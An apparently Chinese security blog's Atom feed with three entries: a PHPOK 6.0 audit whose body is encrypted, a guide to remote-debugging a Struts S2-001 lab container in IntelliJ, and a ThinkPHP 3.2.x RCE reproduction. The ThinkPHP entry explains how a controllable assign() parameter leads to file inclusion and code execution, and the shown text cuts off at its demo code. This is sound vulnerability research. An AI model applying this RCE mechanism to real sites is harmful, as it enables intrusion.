<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>0xCreed</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://0xcreed.jxustctf.top/"/>
  <updated>2022-03-19T05:59:10.412Z</updated>
  <id>https://0xcreed.jxustctf.top/</id>
  
  <author>
    <name>0xCreed</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>PHPOK6.0代码审计</title>
    <link href="https://0xcreed.jxustctf.top/2022/03/PHPOK6-0%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    <id>https://0xcreed.jxustctf.top/2022/03/PHPOK6-0%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</id>
    <published>2022-03-19T03:46:44.000Z</published>
    <updated>2022-03-19T05:59:10.412Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="07bed5c926950c4c60e95e78dfa0f571b3e3c49f3eb6404c3d22f7856614928c">541ed2b57286a70f48aa3dc8388e3d2e3bb7a3a6e58336762e2c17df79fe1c07c68c5c6fa02a625b3065adfe48ccd8cabf6a656628a1dd0b86d44ed25c055bc350db947c2a3acbb734e27c9f28b5424f119c7df68228dd5628289ac8215e3d804b2d7afc4bb4b0391e8a68fff8c11db781f63ea572a5b36967e563803cf849a514a2340310b2f0a8635d85b0cb43dcb3612a277e42fa6c162d95530ee2197118048bfade558a1d07fe54500a58e91df9958d0192c9a3ae479ca7109eddf14d97e48b3bb4a17631f0454d20261ee6f2eb1064594a0f4259c384476e77ca66fdea248eccb5c55e9c28d7fb36eee7e8e11f64fba87c4020e290e89f673a2c95c503fbc71cd30928df5308a48bf6faf0eb48ba5889323ddbdc9c7a4294399a7067011f785272a91949281e808e1ebc47a3ad4572e369d55c0b231e635eedf299c48993db95b7de7815d0c872b6b9e5fce7228fd3f9bfd95e74b65d3f8054e6d786f8922997f0e84c051e57e12d10e6877b933f458260877909a1400896d2840ffa5455bfa832b8524804f2c5f744717d18da4ad87fd30874def8448a8e91d814c142c894278bb76c0a451f3b26aa99695b8841804be54cc0fc5f64ffa18fb71177d247d93f0eb772f8f9fdca189e56eb5f52c67cf23c458cc57473da349646d0c27e770ce1ff829c5c9d7f91883b20998049e0bcd5716c06dbea8bfc824004912709908827bb2ec2c52bffdfd137e1b3e31a414ee0306f2e7b1e68adb8541c368c306528091fbc4ddb920550b6b098297e03df3e95b9973a412bf7eddabb8643b661c917f54ae141571d22741ae8ff6787f13bb5789d75c03004721bab514d8590a716b24dff85c929677d4b1ec35254d86886d70acbf6289af22aca58c2b80ccf6dc11cbbf424b35391e06f9604c6d3f34451fe26409c35cba39936393f26433a700201fa8fe1bfa72728c6dda92d66a109c0dded40c5a2c5bd2a7463a51626fc277bf0461d5902aeec3d53530037de8549e3595ab830a6d75e4cfa68c32781cef977c6d4edc73fad4fbc84f3731897b96cbafe6a3753718a95b42a9bc2e1f24a13a95492e2ca9e726eb3ab22686fcae3b8f28d9966805551d3986e24112169a77cbeb90a5b2678c316155f43740afdd8124c2ae427d7b4bbde8c443817bb42f616e32653378c6187fce3d379a825a7952e75a022192cd92f0dfbb2e42718058a4ae8b7388872eb84d8aa91210cf0a91ad18260eecad300aa7cc971a98910edfba7298fab3b6ff8d6cbae776a4eb6c72a7440dee268ac6773852cdd31e646a46a1a9b7181bfe7683c98aab48c6123570bfc99d3bdc4a8ef3c12abd4377172da3af5ec2151235b73c9fa3acb38ef8f747acb430e15d380d3ed92b85a05c89b5d6ed9cf0f78cff4aa4a068f1952042ccc55e90f1184aae3e7f7859b828952e8095855b72ef8eb34ad5baeb6816a88235d7c05861cb49518d6300a3f739a5610d54be2ba9ebd61964d2fb3ce34c3f770907fd47ea3a7bda3aa98dbfd547893047de077dab08ad7b9b4cca8a8a8f57d78cadaaa96467037383f3a3db1286f2d5f99b6b2e3652c3a774635dc1d0dd43d217edcbe77d4fda0ef99af5079401da53a0730af2cd8b9338455dc6c07f8865fae15f3769667e5891c56b36b81b863222ca3e7ece97fb2ebdf5eaa5992ab5fdb8b14333137b9658ffca38665fbb317717fc38af0c8efa6ace068c058927931fedc6204aae48ab1bb6debecf4a3bd5a8642dcbc6f148d646bac98ea2a4a9c17544d1b8e38f627bf55d89702fa132d13f3a2fbc3e72c9f070ccd51abe30f80b63b67b16a618e472bafe264564341b6a2e17027b537ed74083edc1f8b3397db2afbaeb7a3ee8e9d19e2c1336239655f807a7e05c7d8974e56e5c83dff7a56fe83f87aeab2e652fa5a0fd9577a3e17656cc81c08202cb56a851c8b01717f9bea7a929e767a77772d3d4394d13fea687413ff95c461dae17e1a413b38772347b7dc0b8946247474de210b47b12d9e25219d08eac3a84ce7a9446c33eab869c25b14edfd73ecbd4d67b75902a181958f0dbce864bdadd2fa85b8c2cd5796196c14f48e8ca8876a4180f63ea3a06dd188588fa38792d5d25149c861422dbb86916b8fbca8923e7f33a8f594dc76d0731ae70ed3f3eb2d0a7fa3db1ddc52bc78d15bc3021bf73e67e1491a49920ca670212f00f95b0762a5414746ee87ae6a2b361df0713c2975e42bd4f375ba80b8f991c86006427d005ca091c1155bc30e628d0846d48479e745acaf1020aa7b28acaf4a52349636263762bd90478e0c4c3e54551d5498173828a5d75b257e12051985ecc47bf1a4c63fb73b6a78c96a19b7585f748272b8d29e9b6c61446bde7f52bdfc3710b39091a9d32ab1c021b6968dac4642c1623f202343c0fa844f2c7c691813683f43107fb8f0679fdb7e9f790b58885318a0ad86e842d61c446b10bf31fd02a70c8b510fc60cee52c909a328c37be9e54c4a3cc3ad166fb0f37903abeea0c1369b584e775e07317f2b731172eee8e3f2b230aa76fd329531c506a2d4f38668af1550db613a233d9b94a9381c89d8c207bce37f0a9893a169c49bb0154db71204c6d425a4f342fd9c6c16c25d442acf3e6d67b33194821c77348c4d990221b073015965ac1a67046afd1d72431678553da8ffc26aea84c7d0c3dce85e121943e57edacb72892cc2e9bbdc3f9b32e0d53131cf9bc0086dedcb929bb1a2b7248f903a00ea9efe406b050fc5cbd8c29133036d4ab702b8d990e9583ed1bc75dba8dbff9630f5662e0ddd6751269b7e6c5683c50ec18457708426c4dad26025bddf6ad9fbc6dca84a571017d0950ed83c78d04d5ff1bc12f342fee93c4a16cd3608263abd3405fe6d9b3ae2080e8fad681bcd06cc93d814225c8ed15b4b81025eb2cbf5d6c73f56ffa052864849f8ba14e78e27baab098d278ff75a9f2213b4b6584ad6657540b77f2432a73264adf4dbb9341684eada6ebbd1eea9799fd8a152b3809b9ab44508f5b64197f0a0a0813eae7fa7bd79198a80fb57dc4404293bb23b2f82dbca89e73f63d05ccd35cc17a98aad8cb195dd57a151729f387687044abbf072ed569041ffa2b675834cdf4a56c9ac092bbf20cc5e923c5dd368ea9a5251ba696a524b3db6b3a9625b15535b312597d93246aa505600d8a9438c70de0f7f10773f3de3dfe10632a3fcdfdad4b373d11abba8e413798196a35b26e004da3a91a7e8b895cecd135b1b5e866a12ec86ad5c8e982173381468117f82e8b5f0559dd41c461fb5f730a93af0ddc346536c8fbbfae742abd392fdb5220c649df6624e44fc954e3ca19794cf8f32d3e0c6037545458757e250330b2ff0f0dd2398f5892cdb1d598ae07d8fed4c8fe624d3f3bdcbebf07762a79e0b118cf9d6af155915d18edcb4b8f37aace4291bd56ba0330f5c21cfb113a40a2354d993bf86a69d37144986e194350d37d6d6321947ef56ce211a1003136af199bec4f1b1714ba91df5d7c3a452cc5c59b7103cbe8596b62ab767bb9c1018056d9f3d8a8036dde7f0b1a428fecdf7c63a3fa6da52d28a033ee79fd3587c95ca4168e40b567f05cc80db8e06307874445350ca8100df621305f6f2f09a3e3be26add73dee0045e61c1503d02419214a75bfe6ffeaa10489463cf833a3a8e8306974fd3f01b156d3a277e292ea0869abdca002d200b04c1d2b8d417cf63ee755a8647ad16a86112d6ad8aa911ce7a669bf56bbea6b88d85657ec05eff2c3fb7a44e544fb123205c02129846bdb58794c507889cf52fe34e3a76242fd6ecd04a25cb5ec1880fd48be4a82b36f1b8544fb25e3db4d5cad77df1edd77334dd75a9915874576bdd2cba733587b717cf07b3321408a9bd916ee31f68eae6980db2db23d009f072dad96159b32138ccf7e05c3ace987946988edebd2ffa3f69625840a506508ea7e8255b2ba43a678625d7b9e4333365616522c21826bf0d174fa8c53cee8730ee6556bd59cf8ccc792fa708aa281a9581490e060d43d1cc57eea54c4f5a12a58c464c53332ea15f297b7f95b4d269b4fd444832e70a9b883a31f93b05df81ae62c9b53606c533d07697718da29d744ec1237ac34f81ef34eb2a5ccc672b87f6487d64acc910a8858905ce36f0252339914e71ca71602c1ded7abd7558d51459e284e0551d9b61432e2905ace35bf7a2495bdb820f3d62a02b152cc16282b7317f1c3767217fde6d54981b7d1644e160286cc22acea54feb680d210bdb9b02f5d56faa66858905b34b8e9fc17bd99a4bf338a0e0a545d7fdc9be40c094c68eb7820b35919f3d37844ec9df8d9782d332d1e9756fa9cdfc6790d7a64575fb06bd85078c672b8a52949e5051c7deda554fc0522a494fdac83248b76f2e19c0d41df25801ceb9c3287e991dea452f40bac3db0b5c5bb453a70da9bb12f0685d9bac7d9ddf31b14ef9c1c4307a9e59bc0a9774e3061786835507c03752e003fb89e833528844820566816dae39e05f21b774e0b339ee91d9c5e32ff08959f4c7a861310afdae290f5e6bfe759251d6bcd749c1071566413b34e076c668d0bd657a68c6ad7ebff52099bd2bab7ba217762c1f0e9fbaee2e30805bc540ec7d91540f00c24d121f8b67eb9a91bbc159b075e83cf1613875776acac3192400af2e5ef5bc13dd0b43262d670773981dff2c58f95e0cb944364c5d74e242ac552638769a1ca077bccdc3b99ba1b5b3e9b554630a932352c8a74b1f52e22ee448af6c3317e81c35ea0babd36b96aad2d5aec63581016231dc6606c82d116559a7906ea6a12697e9caae77b3ffa68c2d207750b6a1a11abb174104b224087b950898c25cb779c067e746d49402142ada03abe42e130834557fe7a8112722592eb17c0100087d7a907a5986a62187751c5d72d570ff6d4e42dd491cf20e879548c1f92345c994850166a203c358f814d7258f031a429928b2f328e88d13086df40fb775fdc8c032cff42c3e74fb4a7f58add888d71a7b9347fc2c6044025ce08a1b66d57bb54a67e880f2a87cb5f979c6e18e5f4c58af8be9240cbe33cc00aa6600a5ab63b627077767216d8daa9c3954fb5cd1e4120265e96e2ce454ed486eee829c20313b84ede574e25d47f7523b0567f868d971d32b16cd707a31a71ec677201b173b73c28dca7986042251b81ab852b7612be0c094be988bd0252073a21893f3a7f5c04871e15fc310e2a8d87adf2d238bd9559cb0e8e2f0a37fc48ec0519e409801b311dd3c4839844598ddd1325a38d4b89283baa143dda26c90f398b0f3dd5fd3a86f06f9984eca854a882becfd22205dc4a80c74deaa628f27717455664565b49d0c3cc182b805738a5fccfee0019da973aec25e223703ca5c8cf250c9a1c9d77ae1f2c89cb8b182c0a4b388e7813f45c8ab80c84d01679b64c50b25b92c167d3a38471f4ad50925966d5a54a57fa9f7ed85a05a3fc947fb72a4dcb571869dbdd26660dcb705ea34e40533115ae0d587d97f3d08dcf71e07330780ebf1cc1de8289515e3dd34a10121722d0925af4bab2ecf825b4f74d0e6f0b102bcfcb49a7af0df0e6264b1dda4adf1fb32f65879a65c2932f1280c65f5bb158afa047f7983ab7fe5b8c4111a707f790b234e0ea65aa5826f8c9323e2e8def38a7c7bf86a802d7c815a32fef2f17c0b4473ab82f538c423c726692908bcbc14df247e2f1feac4d025756fb8a74953aaa35babbcb032ce18e66e34a9c8619f890ac6576f6776d45bcb7eb5cce641d42bae00be4e421a663bd82f27a5254d5a2959446d9b1931fa48a317384f77b4d0ed7052e62adc7ee2e9cefa20d92fbd11dbb191a5a0a28cb42bf08a84943fe1e8d5293f7638b4244412d25f873ca8fae946a264664ce981cf67b20c467f8a5428bec51585ce7e2ea753ef33d49a01d76c8b2ce43a901b1a943e5fd791d6408b9ce7a95e60495ab7609d5f3dbe967cbdb4f44dbb48cfc22be0f9f52a4905f77fa6d9d654c90b7a7f72c59d65239f10f1120f0d78e7294465a44003692ccf73fa1cf7bf3b3465343fd1584e2da2f73b2b5fd6c6955b8931f7226214eb80052c0218a814da8db2733b71e1f02147653a6fda49032006d7950433ddea0004c319c71267be0af0525b45294c2403fe35bdf2eba63fed1b36016c8b9591bd79fd98a136d667e86c17d97d573e6bb1ef8f4eb2456848ba6b56e6e875bcb86054c28ac97430b303d8a0fe693041eab3895a0881714469c926f0be367699af85b6757d71e34cd116d5e0597a3606c5c0f78b7e4b9b26e9efe9a043415514095479cb78c419eeab20577de0d238c65df021d8b24c0beb978d71d38cd4075235bb2172b5f2efff3c47290bbe1266ec342ea7569093cc3ee3b5f3365ee94208845d7ed1ebadb54e02b93c91c43fd20a5151d806895febe77f598b25179aada546bf343381f81f18a22e87b06162a305a65894c8da77d13f3e8b76c57354452cb5a5e2594427ff37e842375b0c019c150d2f05f6fb2e4de970e89cfa04ed67e9b3f25afd8845299e72a2b9729923d63b088442a39456ed95093e712a6fae36c301b1f635df4e9be34db5653913f29437e66db2be87e67bb7eda7fdd91293ddab7df3bcad85b851fc9c9c3bde3821eeee9912367c36a043dd138c4c9b4831b41a0758a226f44b4f303a1e72fc815ad05df9d1d57219764007b23629eae233acee4f5ebeb26b1f08f4fddcc5f6d2f2c06f96df8a3ef600ee9d244bc533a163635a33c51ea93c75a4429c5c65ab984008d5f57e39554903ff4c3edd3ceadb80a4c248bd3a3382c8a44e1d2d17d36d21d48bd9ca4ddec61246c87d595c3bea1c693f4a5bbaee92e73f301fd421140f5b53594947fd690f6a4697deb5bd332b15cb9771c7e6e52fbe735dbe399361a105abf3f156391fa3a11d019f7eb185e23c8ed0d56a6f5115635725036f880f4ebe3df5fe6363a918b8cd71895cf8dc650260afcded978f8cbc6ca45d9cd24d95a46bd4720239cd8a8d9076b18f8ac616ec3ab14d03a8404a9e2a4f9a0091457ad378b9195b30525cd335db91695c7e63f26e4a7ff723b1ceaaf8c3005c3e000f9425f5febc4bb1f86b3d3e90ba28e1829d63b78363437904aa8c3fa97e5e251bed05ee981c83c20386decdd446578e1bd05c5b9e2d5c2f36f6554b64f5b9530954d8cad6234065d5428fe4db59c3bff158cf9b1b6a6bd0ab643ff2134bdd77a5ab31157f3b467f7a32d6a5fcb1812b1e4ca7581d63f3035ac1b16533da75c692d6ad1b09315b1da6ebbf38252624f726bf1b9a43e738b3d25e413e2186d50a02639c9e046665764522d6bb768f76a848746164c27b9b8755bf91783ab22a76fac15cbbb1e32013aa4f467ca937f9a613d0a6b9ee2586a5355e0ca3d8965e0fd8e236b20ff4fcd3df6108ecd592d484ea20904ef82f38998001eccc3dde988ee496e0e75896b2ad7ecdd7f0d5dbc3feea74f8dcc558597753aae4fcd34b2a9cecc8e41d1ab950cf50513c6c4a46c13b157a0431377f43f3f3ede2aa41c701981850b33ea94a14910908d4eaa7f0b61e2e1e9703d947f05dfc15d08660a8d908b2e8dff5f126d5c1f1144a25bf38487b6b90e36e346146da7eb021b7ded4fa61f073cb33f987096fb57ba8695f7e1da7c2406460be5390c8e436f336954b02f5c00c6167e9c75fae4bdcd6618ec57b3f1029a1a15d71f7422627adffb1f5fa01224ca93a65da394c94008faafa568e519fd899fc44e343a85fd9f8fe7b682e4b9071acf111c0100c9d3d8623c3bacd1b048acd0377c7380505197c113c344b9fcbb14551c16b2f27fbb177c30201844806a8e4805398f7f7371e11667d282cf5e8598621485f4fa7fb9b3c0196824389c5e39828ca2e0b13c2100cf7a9b22ee5a692c0acf5de759d2801da7e8dedef40576471e9ea00377194c389c90c11851dbee7d5643c336c21122728a96ac201cec8a8897f3654e708e7d7e9050cd6075b85de156f8fd26cd7cb3d53b24400a06c532904b33e91d0bafafca9be8d1f0443d990baa4193562e0b2c128af036263de6d3f799651d9a66e51bc5f96f6b60ae9c5f8bc4f3512c69b31eaf0a75815dd3699b0f2771a174e6cd1dec9339c0982a21e36e0f48cac15f0732f3fd01d3c3df171172a0f81362ea744015098ea5036151f3645abea738e7e957ae63233d90e8c3515924aeb830e62d97ec20668011f3cf40bc5d5c26692cac99247b540071a58ac6071c3342a87f98af0b8db79f7a759aee98865ead06484e636709a5e500848adb59ce557f5c35010ff548bbc8b18646f2a66bc49d00be8eddd04b99895ae46cc907772434ed6bb89d0968e926bab53a90b6ceef8f3633ade3611a403db92e1b33eeace6f78ebfa442ee4a46005e92e7d5026ae6411eb41a339ba878f66675030478fe993ac4faa36ac2704b3ce09d3c2ae5c9990081019b4bd95a5a4caf9bab2411b25f0fe6743228f090e9836418421f38925892e1db16fc6c89c4b904ece53b4192e1453aba0057496e949d5c01f859a53760b9f3479be4555c5e909b0f0f96898c11c61a2073507955191e626c5e558fb889441d61f8a6a835e67114c16df2f8b84d61469cf3393d3e1e95b402c0ea53145f968b6adf42d482f9a6e3a73354cf92463ab91d0db9f309b2b352548c959b3b8231ab8c456dd68bf7220a01c84416369e1835f8740d63365d623b24e397ff2cb09164b3000b9760d6980b467eefee66942b8eeb68b938f73569fef02fe56799a3fdf755e01224b2c9948fb48260f337aabc42e2bbf8ea306e6bd79dec058bcb5e999f6ef105dfdd0c49c55595ffa202c730521c087e7413f07afa235df19442ae9d71086eccf1a933311a3397506623cf22ac2cb24a9583c79590b80817c5590d306da5bd5ef5db6af6f2b53a32eb4d5a46fe3ade50f337a9a225aa01451fda8e534f0eeebba6977dd54e30582f2f4ab2b7baf4528bee7b84e2ea05ce9ff0a99c6b7221d65426f17b8d694ab82ebe4596824f0b93d25635efb5d7e7168018e5ff4cd31e42d24c9b7efe75501b4a50232ab221f865d4ac8ba40ea825595200aaa8d9b819e9cd030d3a6b112e772353b4dd72a357b20d7ac78a2e85b4787a18c33349d8d80c035e888633546cd2ca7006f22b968de2272a1666d8b8c8490257b4288a5a9db913bcf54fee5d3801b5eae793f952151c10c2af0e92d4118f65e1a9dfbed20c7ffbd777f1a9544135584a95e43ffb7a2de50dd223b15f3ae5227d4d6ba38b7fa5a7c1ceb40dba72828eb67b6d9ef6c5dddcedf1e6663cc4a83a276d49af945275f39abb204dc3129b54cedc9b5dab6f93d35fa0526ac2987f843ac05668936ce3d18464b3b65e5686eb544d415eef4d6e08714e8c53bfb75fc58fb4828b94eff964eb146380a6edad9bf7f257c31da45c69628872461f08d912d7c41c0dcceeef5b1f9ca72e55ca77b1231ad14d6191704780c44057ddd3021a13c7364e75ad5c990f372bdd93bf9644917797191f5b3e89c4bab9e6b967dfe0a888c1ab325906408f8512ce75838251dc91c9b4d9d3ff513de73229e503bc2befd322d251b391c0084e8b9d256114e61fef552c3c81a232a8e1c8a804f9daf13b4c97095dfb2f1224629aa6a522d3cbabc988e89112b170e06ecfee6ace02839827e306fe1e5f16c85c07def974a40bc61ee6dbee1437515260d2ff7e39bf85dd729175eac6c7e79e3b39039b8dddd726e889f7bdb6f51b97205b40ff03433aaa77589b7c962dce9f18baa7844f1920a26897319c762f04b8530ebefcccb43d19a4a3bd610704282d03f4a130757c303a86f2fe4a9e55b18cfee7988c2e2876934f0ddb3ba037e8886ee5369a2d93cf8643650bed0cbaf9f82af24998375f721e9142361bf0d0acbe8328ebfd4f2270f57b0e59b20f0134fc17b3b672e7d3900df1679993b1bb7b0a36a1666444133b16ab5a9050d527b1d8c71fe7b8bcc9749242589afdbfb1674394c109d3a70f2e0526b1e34b969702cf23f2fcf6c1cf7f9074832df424bf342ec7ca1a1310d22f8f42630d6c3b568ba8f07c42495d86e577b61ab26f58facd304562818617a14ab4080eafa8d19277c8439469d477ce27a1f62f22edf8e9bc085c32876f039013a0a8fb4c554c4df1ab4fe8780396ea890a296f55fcef66fa034cfd5786aa9876285913abbf1b7a38c35fa912fc1ec01d3d237c71c38a45e2ffb69dcbbaad2e730aaddf5215e4787d3df153e8a0f42f22ac40d0fff9288f5f92dfcefa626f95ef5f741dd6411c6f296f587bb106f190e0c8a2a43c048d20d7650355171b72844ba0fd0b5e522a60cdc80abf0b722e75cc6b3548b73b9a7988c22a6512403cfe7b9ea4cfa52af80c0ea21cbf126c5a9a0b3b09d22584d1cea3d4c7f5745af2815464a8ce9bd2a6820bb7a58cff8c8133da067bae1db7e50b097438c6b675bf329b0442daf57fa43a294edf3e57430d150fcaaca8f55f5688ea595c6344c3c77ef05a9611ce7af425d6e57f33a827579706e8d3eba7a31a96699a9abc9114d6a81e9cdef7f7067da318ed363b3dd6fbb354802b3fd68fe8eb2db62d5c92566bbc6a786b2f0e49afb1db00df729a494e1f43fad2fc34d2e42a6b8f3466cd90f8abd61c60a0c6e29633c030622357081bd716b6d8791dae0653bc64be22ce44a689bff82cefe5008d2d40d3a635da104cbd92c9e0e600cf24ead37da303f463f067178e0cea5d95934cbf69619ecda169944951244bab5feb25070f9242e1a6ff6aec2f6d233b65dbbfaba98d91ff57b831d7d9a71a2048311a95deffd76c38e0534f3f30892d79e4aa898a3c78bb655804f11018860100d172fd315998f55ea6ffe4a739346d45e18ba3351db27cc6bd0e8fd447d8cbd02d3cb306f4b9f7c1e908a1e9640b5ddb85a417007965a6667358c9ca4a81fe336ddb418c16f9b880709019f19223a7e16973b65a46018eb306bd4675ba50c3a4d6b880ba3985f5904177d66dcdb3243b9434de5fc905300f1a6f372aa7020ebdb437177a1e3d450e115563e77774322ec6084d9b89616847c81af25e43abd32fc00db1ecb9b60ac4310e7bc38427e0278c4921846ae08243f2990415a47541cb0b51330a35e7a2a7e62f28dc48bef29b674a11da4ab008324b59f188093caad8e7ca49528061229ad7728dd711ff675c504e263cf268204a2e31bb1cbd4f2d154174da70391e5ed9a09b250e3ade5f72e1effd973ce9cf8e5bc61fc1d836504a920e0c3b2fd532597</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      看到师傅们说前台能RCE，直接拿EXP跟了一波
    
    </summary>
    
    
      <category term="代码审计" scheme="https://0xcreed.jxustctf.top/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="PHP" scheme="https://0xcreed.jxustctf.top/tags/PHP/"/>
    
      <category term="CMS" scheme="https://0xcreed.jxustctf.top/tags/CMS/"/>
    
  </entry>
  
  <entry>
    <title>IDEA远程调试JAR</title>
    <link href="https://0xcreed.jxustctf.top/2021/09/IDEA%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95JAR/"/>
    <id>https://0xcreed.jxustctf.top/2021/09/IDEA%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95JAR/</id>
    <published>2021-09-08T09:10:19.000Z</published>
    <updated>2021-09-09T01:35:42.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="IDEA远程调试JAR"><a href="#IDEA远程调试JAR" class="headerlink" title="IDEA远程调试JAR"></a>IDEA远程调试JAR</h1><p>最近把struts的相关洞跟了一遍，这里记录一下IDEA的调试环境的配置。</p><h2 id="IDEA安装反编译插件"><a href="#IDEA安装反编译插件" class="headerlink" title="IDEA安装反编译插件"></a>IDEA安装反编译插件</h2><p>对于jar包中的class文件，我们需要反编译才能看到源码调试。</p><p><img src="/2021/09/IDEA远程调试JAR/image-20210908172825269.png" alt="image-20210908172825269"></p><h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><p>以调试S2-001为例</p><p>环境使用<a href="https://github.com/vulhub/vulhub" target="_blank" rel="noopener">https://github.com/vulhub/vulhub</a></p><h3 id="tomcat开启debug模式"><a href="#tomcat开启debug模式" class="headerlink" title="tomcat开启debug模式"></a>tomcat开启debug模式</h3><a id="more"></a><p>修改catalina.sh文件，添加以下内容，调试端口是8081</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">JAVA_OPTS</span>=<span class="string">"-agentlib:jdwp=transport=dt_socket,address=8081,server=y,suspend=n"</span></span><br></pre></td></tr></table></figure><p><img src="/2021/09/IDEA远程调试JAR/image-20210909091427403.png" alt="image-20210909091427403"></p><h3 id="修改docker-compose-yml"><a href="#修改docker-compose-yml" class="headerlink" title="修改docker-compose.yml"></a>修改docker-compose.yml</h3><p>因为除了正常的web端口，还有一个debug端口需要映射</p><p><img src="/2021/09/IDEA远程调试JAR/image-20210909091614647.png" alt="image-20210909091614647"></p><h3 id="修改Dockerfile"><a href="#修改Dockerfile" class="headerlink" title="修改Dockerfile"></a>修改Dockerfile</h3><p>需要把修改后的<code>catalina.sh</code>替换原来的</p><p><img src="/2021/09/IDEA远程调试JAR/image-20210909091713142.png" alt="image-20210909091713142"></p><h3 id="运行容器"><a href="#运行容器" class="headerlink" title="运行容器"></a>运行容器</h3><p>如果之前起过容器需要重新build，更新image文件</p><p><img src="/2021/09/IDEA远程调试JAR/image-20210909092020998.png" alt="image-20210909092020998"></p><h3 id="IDEA配置"><a href="#IDEA配置" class="headerlink" title="IDEA配置"></a>IDEA配置</h3><p>把项目中的 S2-001.war下载到本地，解压后使用IDEA作为项目打开。</p><p>右键lib-&gt;添加为库</p><p><img src="/2021/09/IDEA远程调试JAR/image-20210909092541288.png" alt="image-20210909092541288"></p><p>文件- &gt;项目结构 设置项目SDK</p><p><img src="/2021/09/IDEA远程调试JAR/image-20210909092729175.png" alt="image-20210909092729175"></p><p>右上角添加运行配置</p><p><img src="/2021/09/IDEA远程调试JAR/image-20210909092920216.png" alt="image-20210909092920216"></p><p>监听debug，下好断点，访问触发</p><p><img src="/2021/09/IDEA远程调试JAR/image-20210909093059050.png" alt="image-20210909093059050"></p><h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><h3 id="无法评估表达式"><a href="#无法评估表达式" class="headerlink" title="无法评估表达式"></a>无法评估表达式</h3><p><img src="/2021/09/IDEA远程调试JAR/Image.png" alt="Image"></p><p>和IDEA的自动导入有关</p><p>排除相关类的自动导入</p><p><img src="/2021/09/IDEA远程调试JAR/image-20210909093454410.png" alt="image-20210909093454410"></p><p><img src="/2021/09/IDEA远程调试JAR/Image-1631151331481.png" alt="Image"></p>]]></content>
    
    <summary type="html">
    
      记录一下IDEA调试环境配置
    
    </summary>
    
    
      <category term="环境搭建" scheme="https://0xcreed.jxustctf.top/categories/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
    
    
      <category term="IDEA" scheme="https://0xcreed.jxustctf.top/tags/IDEA/"/>
    
      <category term="调试" scheme="https://0xcreed.jxustctf.top/tags/%E8%B0%83%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>ThinkPHP3.2.x RCE复现</title>
    <link href="https://0xcreed.jxustctf.top/2021/07/ThinkPHP3-2-x-RCE%E5%A4%8D%E7%8E%B0/"/>
    <id>https://0xcreed.jxustctf.top/2021/07/ThinkPHP3-2-x-RCE%E5%A4%8D%E7%8E%B0/</id>
    <published>2021-07-14T03:39:25.000Z</published>
    <updated>2021-09-09T01:43:16.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="ThinkPHP3-2-x-RCE复现"><a href="#ThinkPHP3-2-x-RCE复现" class="headerlink" title="ThinkPHP3.2.x RCE复现"></a>ThinkPHP3.2.x RCE复现</h1><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>该漏洞是在受影响的版本中，业务代码中如果模板赋值方法assign的第一个参数可控，则可导致模板文件路径变量被覆盖为携带攻击代码的文件路径，造成任意文件包含，执行任意代码。个人感觉这个漏洞虽然不如thinkphp本体的一些RCE漏洞影响范围大，但也算是提供了一个思路，对基于某些框架二次开发的系统，寻找其不规范的方法调用的思路还是值得学习的。</p><a id="more"></a><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p><a href="https://codeload.github.com/top-think/thinkphp/zip/refs/tags/3.2.3" target="_blank" rel="noopener">ThinkPHP3.2.3</a> Phpstudy8.1.1 PHP-5.6.9 Apache Windows10(<a href="https://www.kancloud.cn/manual/thinkphp/1678" target="_blank" rel="noopener">tp3手册</a>)</p><p>如果是linux可以用composer拉取环境( composer create-project topthink/thinkphp=3.2.3 tp3)</p><p>先访问<a href="http://xxx.xx/index.php" target="_blank" rel="noopener">http://xxx.xx/index.php</a> 生成项目文件</p><p><img src="/2021/07/ThinkPHP3-2-x-RCE复现/image-20210714130932384.png" alt="image-20210714130932384"></p><p>然后在<code>\Application\Home\Controller\IndexController.class.php</code>写入demo代码</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">namespace</span> <span class="title">Home</span>\<span 